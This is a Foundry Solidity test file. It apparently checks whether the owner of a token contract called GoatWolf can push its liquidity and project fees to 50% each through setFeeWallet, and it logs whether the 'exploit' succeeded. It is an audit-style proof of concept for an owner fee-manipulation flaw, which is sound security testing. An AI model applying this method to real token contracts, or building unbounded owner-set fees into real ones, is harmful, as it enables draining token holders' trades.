// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/GoatWolf.sol";

contract MockRouter {
    function factory() external pure returns (address) {
        return address(0x1111111111111111111111111111111111111111);
    }
    
    function WETH() external pure returns (address) {
        return address(0x2222222222222222222222222222222222222222);
    }
}

contract MockFactory {
    function createPair(address tokenA, address tokenB) external returns (address) {
        return address(new MockPair());
    }
}

contract MockPair {
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
}

contract GoatWolfTest is Test {
    GoatWolf public token;
    address public owner = address(0x1234);
    address public constant PANCAKE_ROUTER_ADDR = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant MOCK_FACTORY_ADDR = 0x1111111111111111111111111111111111111111;
    address public constant MOCK_WETH_ADDR = 0x2222222222222222222222222222222222222222;

    function setUp() public {
        // Create mock router and factory
        MockRouter mockRouter = new MockRouter();
        MockFactory mockFactory = new MockFactory();
        
        // Setup mock addresses
        vm.etch(PANCAKE_ROUTER_ADDR, address(mockRouter).code);
        vm.etch(MOCK_FACTORY_ADDR, address(mockFactory).code);
        
        // Deploy token contract
        vm.startPrank(owner);
        token = new GoatWolf();
        vm.stopPrank();
    }

    function test_FeeManipulationExploit() public {
        console.log("--- BEFORE-Trigger Fees ---");
        uint256 liquidityFeeBefore = token.liquidityFee();
        uint256 projectFeeBefore = token.projectFee();
        console.log("Initial liquidityFee:", liquidityFeeBefore);
        console.log("Initial projectFee:", projectFeeBefore);

        console.log("--- Trigger setFeeWallet(50,50) ---");
        vm.startPrank(owner);
        token.setFeeWallet(50,50); // Attempt to set 50% + 50% fees
        vm.stopPrank();

        console.log("--- AFTER-Trigger Fees ---");
        uint256 liquidityFeeAfter = token.liquidityFee();
        uint256 projectFeeAfter = token.projectFee();
        console.log("Updated liquidityFee:", liquidityFeeAfter);
        console.log("Updated projectFee:", projectFeeAfter);

        // Compare fees before and after exploit attempt
        bool feeChanged = (liquidityFeeAfter != liquidityFeeBefore) || 
                          (projectFeeAfter != projectFeeBefore);
        bool exploitSuccess = (liquidityFeeAfter == 50) && (projectFeeAfter == 50);

        console.log("Fees changed:", feeChanged ? "YES" : "NO");
        console.log("Exploit successful:", exploitSuccess ? "YES" : "NO");

        if (exploitSuccess) {
            console.log("Vulnerability Exists: Fees were successfully manipulated to dangerous levels");
        } else if (feeChanged) {
            console.log("Vulnerability Exists: Fees changed but not to exact target values");
        } else {
            console.log("Vulnerability not Exist: Fees remain unchanged after exploit attempt");
        }
    }
}